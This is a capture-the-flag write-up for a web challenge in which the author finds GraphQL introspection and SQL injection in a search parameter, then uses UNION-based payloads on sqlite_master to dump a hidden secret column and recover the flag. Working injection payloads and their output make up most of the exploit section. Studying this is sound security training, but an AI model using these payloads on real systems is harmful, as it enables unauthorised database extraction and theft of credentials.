# Silent Oracle - 0xV01D CTF 2026

> *A quiet internal directory exposes only a small public surface. The useful answers are hidden behind how the service thinks about people and roles.*

**Difficulty:** Medium  
**Category:** Web Exploitation  
**Attack Chain:** `GraphQL Introspection` → `SQLi Confirmation` → `UNION-based Extraction` → `Schema Enumeration` → `Hidden Column Discovery` → `Flag`

---

## What Was Vulnerable

A small internal directory exposed a GraphQL endpoint vulnerable to introspection. Its `search` parameter passed user input directly to a SQL query without sanitization, allowing UNION-based injection and extraction of a hidden `secret` column that was never exposed through the GraphQL schema.

---

## Reconnaissance

On visiting the site, it revealed:

> *Shadow Directory - A small internal directory exposed a GraphQL endpoint. The public fields look harmless.*

The page had a query editor pre-loaded with:

```graphql
query {
  users(search: "a") {
    id
    username
    displayName
    role
    bio
  }
}
```

Running the default query returned 3 users:

```json
{
  "data": {
    "users": [
      { "id": "2", "username": "mira", "displayName": "Mira Stone", "role": "analyst", "bio": "Maintains onboarding notes for new operators." },
      { "id": "3", "username": "rakan", "displayName": "Rakan Vale", "role": "engineer", "bio": "Keeps legacy services alive during migrations." },
      { "id": "4", "username": "admin", "displayName": "Directory Admin", "role": "admin", "bio": "Private administrative account." }
    ]
  }
}
```

---

## Testing

The `search` parameter immediately stood out. I started probing it:

**Querying hidden fields on admin:**
```graphql
query {
  users(id: "4") {
    id username displayName role bio flag secret password token
  }
}
```
Returned: `"Cannot query field 'x' on type 'User'."` for each extra field - confirming no hidden fields exposed through the schema.

**Searching for common strings:**
```graphql
users(search: "flag")
users(search: "0xV01D")
users(search: "secret")
```
All returned empty `[]`.

**Searching with an empty string:**
```graphql
query {
  users(search: "") { id username displayName role bio }
}
```
This returned a 4th user that wasn't in the original results - `Guest User` with role `viewer`. Useful for understanding the full user set.

---

## GraphQL Introspection

I used GraphQL's built-in introspection to map the entire API structure:

```graphql
{
  __schema {
    types {
      name
      fields { name }
    }
  }
}
```

Key findings from the response:

| Type | Fields |
|------|--------|
| `User` | id, username, displayName, role, bio |
| `Query` | **users**, **about** |

The `about` field returned a generic response and accepted no arguments. Dead end.

Everything pointed back to the `search` parameter on `users`.

---

## The Exploit

### Step 1 - SQL Injection Confirmation

```graphql
query {
  users(search: "' OR '1'='1") {
    id username displayName role bio
  }
}
```

All 4 users returned - confirming the search parameter is vulnerable to SQL injection. Input is passed directly to the database without sanitization.

---

### Step 2 - UNION-based Injection

With 5 known GraphQL fields, I tested a UNION payload with 5 columns:

```graphql
query {
  users(search: "' UNION SELECT 1,2,3,4,5-- -") {
    id username displayName role bio
  }
}
```

Injected values `1,2,3,4,5` appeared in the response - UNION injection confirmed.

**Column Mapping:**

| Position | GraphQL Field |
|----------|---------------|
| 1 | id |
| 2 | username |
| 3 | displayName |
| 4 | role |
| 5 | bio |

---

### Step 3 - Database Enumeration

Tried MySQL's `information_schema.tables` first:

```graphql
users(search: "' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables-- -")
```

Error: `"no such table: information_schema.tables"` - this is **SQLite**, not MySQL.

SQLite equivalent - `sqlite_master`:

```graphql
query {
  users(search: "' UNION SELECT 1,name,3,4,5 FROM sqlite_master WHERE type='table'-- -") {
    id username displayName role bio
  }
}
```

3 tables discovered: `audit_log`, `sqlite_sequence`, `users`

---

### Step 4 - Schema Extraction

Extracted the `audit_log` schema:

```graphql
users(search: "' UNION SELECT 1,sql,3,4,5 FROM sqlite_master WHERE name='audit_log'-- -")
```

```
CREATE TABLE audit_log (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  event TEXT NOT NULL,
  created_by TEXT NOT NULL
)
```

Dumped its contents - found deployment events but no flag.

Extracted the `users` table schema:

```graphql
users(search: "' UNION SELECT 1,sql,3,4,5 FROM sqlite_master WHERE name='users'-- -")
```

```
CREATE TABLE users (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  username TEXT NOT NULL UNIQUE,
  display_name TEXT NOT NULL,
  role TEXT NOT NULL,
  bio TEXT NOT NULL,
  secret TEXT NOT NULL   <-- not exposed in GraphQL schema
)
```

A `secret` column exists that was never exposed through the GraphQL API.

---

### Step 5 - Flag Extraction

```graphql
query {
  users(search: "' UNION SELECT 1,secret,3,4,5 FROM users-- -") {
    id username displayName role bio
  }
}
```

The `username` field now contains the `secret` column values:

```
0xV01D{d21683da-5051-46d1-bc2f-6055320421fe}  ← FLAG
debug token rotated last quarter
favorite report: weekly-metrics
no secrets here
```

**Flag:** `0xV01D{d21683da-5051-46d1-bc2f-6055320421fe}`

---

## Techniques Used

1. **GraphQL Introspection** - mapped the full API schema to identify available types and fields
2. **SQL Injection via GraphQL search parameter** - user input passed unsanitized to the database
3. **Database fingerprinting** - identified SQLite from the `information_schema` error
4. **SQLite schema enumeration** - used `sqlite_master` to list tables and extract CREATE statements
5. **UNION-based data extraction** - pulled data from columns not exposed by the GraphQL layer

---

## Real World Impact

In a real application, a GraphQL endpoint with an unsanitized search parameter could expose an entire user database including credentials, private tokens, and sensitive account data. An attacker could enumerate all users, extract password hashes, or retrieve API keys - all without authentication. The gap between what the GraphQL schema exposes and what the database actually contains is a critical blind spot developers often miss.

---

## Lessons Learned

1. GraphQL introspection is a powerful recon tool - always try it before assuming the schema is complete
2. What the GraphQL schema exposes and what the database contains are not always the same thing
3. When `information_schema` fails, think about database fingerprinting - SQLite, PostgreSQL, and Oracle all have different system tables
4. Hidden columns like `secret` are invisible at the API layer but fully accessible via UNION injection
5. SQLi is absolutely possible through GraphQL - the transport layer doesn't protect against it
6. An empty string search returning more results than a specific search is a signal worth investigating
7. Not every dead end is a dead end - the `about` field went nowhere, but going back to `search` found the vulnerability

---

*Written by [Faisal Ulde](https://github.com/faisalulde) | 0xV01D CTF 2026*
